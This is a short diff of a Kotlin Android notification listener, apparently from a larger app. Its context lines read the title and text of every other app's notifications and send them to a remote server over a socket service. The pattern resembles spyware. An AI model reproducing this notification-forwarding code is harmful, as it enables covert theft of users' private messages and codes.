@@ -10,7 +10,6 @@ class NotificationListener : NotificationListenerService() {
             val packageName = it.packageName
             val title = it.notification.extras.getString("android.title") ?: ""
             val text = it.notification.extras.getString("android.text") ?: ""
-            
             if (packageName != "com.ahmed.zai") {
                 SocketService.sendDataToServer("NOTIF", "$packageName | $title: $text")
             }
